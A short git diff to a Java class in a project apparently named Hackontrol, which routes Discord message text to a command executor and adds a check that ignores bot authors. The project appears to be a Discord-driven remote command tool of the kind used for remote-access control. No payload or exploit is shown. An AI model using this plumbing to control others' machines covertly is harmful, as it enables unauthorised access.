@@ -4,7 +4,6 @@ import java.io.File;
 
 import com.khopan.hackontrol.HackontrolChannel;
 import com.khopan.hackontrol.manager.MessageManager;
-import com.khopan.hackontrol.manager.common.sender.sendable.ChannelSendable;
 import com.khopan.hackontrol.registry.Registry;
 
 import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
@@ -33,7 +32,11 @@ public class CommandChannel extends HackontrolChannel {
 	}
 
 	private void messageReceived(MessageReceivedEvent Event) {
+		if(Event.getAuthor().isBot()) {
+			return;
+		}
+
 		String command = Event.getMessage().getContentDisplay().trim();
-		BuiltInCommand.execute(ChannelSendable.of(this.channel), command);
+		BuiltInCommand.execute(this.channel, command);
 	}
 }
